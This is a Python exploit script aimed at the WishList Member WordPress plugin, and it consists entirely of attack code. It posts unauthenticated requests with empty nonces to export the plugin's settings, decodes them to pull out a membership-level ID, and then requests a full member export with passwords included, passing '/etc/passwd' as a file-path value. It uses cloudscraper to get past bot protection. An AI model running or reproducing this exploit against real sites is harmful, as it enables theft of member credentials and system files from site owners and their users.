import cloudscraper
import base64
import re

url = input("URL: ")

def exploit(url):
    url = f"{url}/wishlist-member"
    scraper = cloudscraper.create_scraper()
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537."
    }

    for member_id in range(0, 1):
        data = {
           "WishListMemberAction": "ExportSettingsToFile",
           "nonce": "",
           "export_configurations": "1",
           "export_emailsettings": "1",
           "export_advancesettings": "1",
           "export_membershiplevels": "1",
        }
        print(f"[+] Trying member_id = {member_id}")
        response = scraper.post(url, headers=headers, data=data, allow_redirects=True)
        print(f"Status: {response.text}")
        try:
            de = base64.b64decode(response.text).decode()
            match = re.findall(r'"wpm_levels".*?i:(\d{6,})', de, flags=re.DOTALL)
            for i in match:
               print("ID:" ,i)
               return i
        except:
           exit()


def capture(id,url):
        urlv = f"{url}/wishlist-member"
        #path = input("Enter Path: ")
        scraper = cloudscraper.create_scraper()
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/>"
        }

        data = {
           "WishListMemberAction": "ExportMembersChunked",
           "nonce": "",
           "wpm_to": id,
           "full_data_export": "1",
           "include_password": "1",
           "include_inactive": "1",
           "per_page": "10",
           "current_page": "99999999999999999",
           "tempname": f"/etc/passwd",
        }
        response = scraper.post(url, headers=headers, data=data, allow_redirects=True)
        print(f"Capture: {response.text}")

if __name__=='__main__':
    while True:
         s1 = exploit(url)
         capture(s1,url)
         exit()
